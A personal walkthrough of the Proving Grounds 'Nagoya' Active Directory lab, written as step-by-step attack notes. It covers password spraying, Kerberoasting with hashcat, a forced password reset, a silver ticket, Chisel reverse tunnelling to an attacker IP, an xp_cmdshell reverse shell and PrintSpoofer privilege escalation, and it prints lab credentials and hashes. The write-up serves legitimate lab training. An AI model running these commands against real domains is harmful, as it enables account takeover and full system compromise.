# NMAP 

```
sudo nmap -sV -sC 192.168.194.21 -oN nmap-nagoya 
```

![[PG/Active Directory/attachments/Pasted image 20250708121500.png]]

Added to `/etc/hosts`

![[PG/Active Directory/attachments/Pasted image 20250708121754.png]]

Add IP to environmental variable 

```
vim ~/.bashrc
```
![[PG/Active Directory/attachments/Pasted image 20250708123016.png]]

```
export IP=192.168.194.21
```
Save changes
```
:wq
```

Reload .bashrc
```
source ~/.bashrc
```

Confirm changes 
```
echo $IP
```

![[PG/Active Directory/attachments/Pasted image 20250708123230.png]]

# SMB 

![[PG/Active Directory/attachments/Pasted image 20250708122630.png]]
- boo

![[PG/Active Directory/attachments/Pasted image 20250708123400.png]]
- nope

And nope

![[PG/Active Directory/attachments/Pasted image 20250708123418.png]]

# RPC

```
rpcclient -U '' $IP
```

Add -N to say no password 
```
rpcclient -U '' -N $IP
```

![[PG/Active Directory/attachments/Pasted image 20250708132028.png]]

![[PG/Active Directory/attachments/Pasted image 20250708132059.png]]

# Web (Port 80)

![[PG/Active Directory/attachments/Pasted image 20250708132208.png]]
- email here

## Ferox 

```
feroxbuster -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![[PG/Active Directory/attachments/Pasted image 20250708133336.png]]

There's a /team directory with lots of users here 

![[PG/Active Directory/attachments/Pasted image 20250708132524.png]]

Rough users.txt list here 

![[PG/Active Directory/attachments/Pasted image 20250708133021.png]]

Going to generate some more usernames with First Initial. Last Name

Asked ChatGPT to create some usernames from this data

![[PG/Active Directory/attachments/Pasted image 20250708134016.png]]

Okie this isn't working 

```
nxc smb $IP -u new-users.txt -p 'new-users.txt' --no-brute
```

![[PG/Active Directory/attachments/Pasted image 20250708134237.png]]


Adding also FirstName.LastName to users file.

Validate usernames with kerbrute 

```
kerbrute userenum --dc $IP -d nagoya-industries.com new-users.txt
```

Oh 
![[PG/Active Directory/attachments/Pasted image 20250708153814.png]]
- this doesn't work... kerbrute did not add craig carr either as a valid user..

Cannot brute force using rockyou. I'd need to create a custom wordlist. The writeup said 'Spring2023' would work so I'm going with that.

Password spray
![[PG/Active Directory/attachments/Pasted image 20250708154400.png]]

![[PG/Active Directory/attachments/Pasted image 20250708154300.png]]

valid creds
```
craig.carr:Spring2023
```

Here are the shares 

![[PG/Active Directory/attachments/Pasted image 20250708154550.png]]

WinRM won't work :(

![[PG/Active Directory/attachments/Pasted image 20250708154629.png]]

Accessing this SYSVOL share 

```
smbclient -U 'craig.carr' //$IP/SYSVOL
```
![[PG/Active Directory/attachments/Pasted image 20250708154743.png]]

There's some files in here 

![[PG/Active Directory/attachments/Pasted image 20250708154843.png]]

There's a reset password directory in scripts 

![[PG/Active Directory/attachments/Pasted image 20250708154929.png]]

Lots of interesting config xmls in here 

![[PG/Active Directory/attachments/Pasted image 20250708155007.png]]

Grabbing some that look interesting 

![[PG/Active Directory/attachments/Pasted image 20250708155200.png]]

No passwords here or anything interesting. 

# Revisiting RPC Client with Valid Creds

```
rpcclient -U 'craig.carr' $IP
```

```
enumdomusers
```

![[PG/Active Directory/attachments/Pasted image 20250708155754.png]]

Some svc accounts here 

![[PG/Active Directory/attachments/Pasted image 20250708155836.png]]

Backing up a minute....

Grab the `ResetPassword.exe` file from the smbshare

![[PG/Active Directory/attachments/Pasted image 20250708160221.png]]

Run strings with -e l flags against the executable 

```
strings -e l ResetPassword.exe
```

![[PG/Active Directory/attachments/Pasted image 20250708160456.png]]
- get password to the svc_helpdesk this way 

```
svc_helpdesk:U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
```

# impacket-GetUserSPNs?


```
impacket-GetUserSPNs -request -dc-ip 192.168.194.21 nagoya-industries.com/svc_helpdesk -save -outputfile GetUserSPNs.out
```

```
U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
```

![[PG/Active Directory/attachments/Pasted image 20250708161358.png]]

This did work 

![[PG/Active Directory/attachments/Pasted image 20250708161506.png]]
- got the hashies

#### crack krb5 tgs hash
```
hashcat -m 13100 GetUserSPNs.out /usr/share/wordlists/rockyou.txt 
```

This did crack the svc_mssql hash

![[PG/Active Directory/attachments/Pasted image 20250708161642.png]]

```
svc_mssql:Service1
```


Test creds with nxc 

```
nxc smb 192.168.194.21 -u 'svc_mssql' -p 'Service1'
```

![[PG/Active Directory/attachments/Pasted image 20250708161840.png]]
- valid creds. not pwn3d tho.

Still doesn't work with winrm 

![[PG/Active Directory/attachments/Pasted image 20250708161934.png]]

# Run Python Bloodhound 

Use Craig's credentials....

```
python3 bloodhound.py -d 'nagoya-industries.com' -u 'craig.carr' -p 'Spring2023' -c all -ns 192.168.194.21
```

![[PG/Active Directory/attachments/Pasted image 20250708164205.png]]

Add craig to owned 
![[PG/Active Directory/attachments/Pasted image 20250708164455.png]]

Added this user to owned
![[PG/Active Directory/attachments/Pasted image 20250708164344.png]]

Add helpdesk user to owned also 

Basically... Christopher Lewis is our target

https://medium.com/@carlosbudiman/oscp-proving-grounds-nagoya-hard-active-directory-bd548b5a740d

![[PG/Active Directory/attachments/Pasted image 20250708165642.png]]

Change this user's password using rpc and the helpdesk creds 

```
net rpc password "christopher.lewis" "Password123" -U "nagoya-industries.com"/"svc_helpdesk"%"U299iYRmikYTHDbPbxPoYYfa2j4x4cdg" -S "192.168.194.21"
```

![[PG/Active Directory/attachments/Pasted image 20250708165952.png]]

WinRM should finally work 

```
evil-winrm -i 192.168.194.21 -u "christopher.lewis" -p "Password123"
```

![[PG/Active Directory/attachments/Pasted image 20250708165940.png]]

![[PG/Active Directory/attachments/Pasted image 20250708170018.png]]

![[PG/Active Directory/attachments/Pasted image 20250708170156.png]]
- no flag :(

He does have SeMachinePrivilege.... does enabled mean disabled in AD

Sooo Because we have compromised a service account (svc_mssql) -> think SILVER TICKET ATTACK

# Priv Esc -> Silver Ticket Attack 

Using these creds 

```
-u 'svc_mssql' -p 'Service1'
```

## Tool impacket's ticketer

### Requirements 
- SPN password hash
- Domain SID
- Target SPN of the service account you’ve compromised

1. Convert `Service1` to an NT hash
[Random site to do this](https://www.browserling.com/tools/ntlm-hash) 
![[PG/Active Directory/attachments/Pasted image 20250708194015.png]]

Here's the NT hash of Service1
```
E3A0168BC21CFB88B95C954A5B18F57C
```


2. Get the Domain SID 

It's in bloodhound 

![[PG/Active Directory/attachments/Pasted image 20250708194334.png]]
```
S-1-5-21-1969309164-1513403977-1686805993
```

Or run Get-AdDomain in WinRM shell
```
Get-AdDomain 
```

3. Get SPN of compromised service account 
```
MSSQL/nagoya.nagoya-industries.com
```

Also in Bloodhound 
![[PG/Active Directory/attachments/Pasted image 20250708194659.png]]

Or run this PowerShell

```
Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
```


### impacket-ticketer 

Use impacket's ticketer to perform the silver ticky attack 
```
impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid "S-1-5-21-1969309164-1513403977-1686805993" -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com Administrator
```

![[PG/Active Directory/attachments/Pasted image 20250708194904.png]]
- YAS

Export the ticky 

```
export KRB5CCNAME=$PWD/Administrator.ccache
```

And run klist to verify

```
klist
```

![[PG/Active Directory/attachments/Pasted image 20250708195035.png]]

Create KRB5 file to connect in `/etc/krb5user.conf` ? optional? 

```
[libdefaults]  
        default_realm = NAGOYA-INDUSTRIES.COM  
        kdc_timesync = 1  
        ccache_type = 4  
        forwardable = true  
        proxiable = true  
    rdns = false  
    dns_canonicalize_hostname = false  
        fcc-mit-ticketflags = true  
  
[realms]          
        NAGOYA-INDUSTRIES.COM = {  
                kdc = nagoya.nagoya-industries.com  
        }  
  
[domain_realm]  
        .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
```

### trying impacket's-mssqlclient 

```
impacket-mssqlclient -target-ip 192.168.194.21 -k -no-pass administrator@nagoya-industries.com
```

It fails :(
![[PG/Active Directory/attachments/Pasted image 20250708200153.png]]

### Port forwarding with Chisel
It's failing because the SQL service is running off of localhost only. Need to port forward with Chisel.exe

![[PG/Active Directory/attachments/Pasted image 20250708200233.png]]

Steps 

```
#set listener on kali
chisel server --port 445 --reverse  

#on victim machine
upload chisel.exe
.\chisel.exe client 192.168.45.204:445 R:1433:127.0.0.1:1433
```



![[PG/Active Directory/attachments/Pasted image 20250708201344.png]]

```
./agent.exe -connect 192.168.45.152:11601 -ignore-cert
```


![[PG/Active Directory/attachments/Pasted image 20250708201708.png]]

![[PG/Active Directory/attachments/Pasted image 20250708203010.png]]

Then rerun mssql

```
impacket-mssqlclient -k nagoya.nagoya-industries.com
```

Well Ligolo crashed. So 

Back to 

### Chisel

https://getcyber.me/posts/how-to-use-chisel-for-reverse-tunneling/

```
#set listener on kali
chisel server --port 445 --reverse  

#on victim machine
upload chisel.exe
.\chisel.exe client 192.168.45.152:445 R:1433:127.0.0.1:1433
```

Then the mssqlclient should work.


Then do xp_cmdshell

```
#you need to enable xp_cmdshell first
enable_xp_cmdshell  
xp_cmdshell <command>
```

![[PG/Active Directory/attachments/Pasted image 20250708213157.png]]

Use rev shells to generate a powershell reverse shell

![[PG/Active Directory/attachments/Pasted image 20250708213436.png]]

Next, paste the entire payload after the xp_cmdshell command within the shell.

xp_cmdshell command execution

![[PG/Active Directory/attachments/Pasted image 20250708213507.png]]

Catch reverse shell

![[PG/Active Directory/attachments/Pasted image 20250708213550.png]]


# Priv Esc 

![[PG/Active Directory/attachments/Pasted image 20250708213611.png]]

## Use PrintSpoofer

[GitHub](https://github.com/itm4n/PrintSpoofer/releases)

Use x64 bit version

```
.\PrintSpoofer64.exe -i -c cmd
```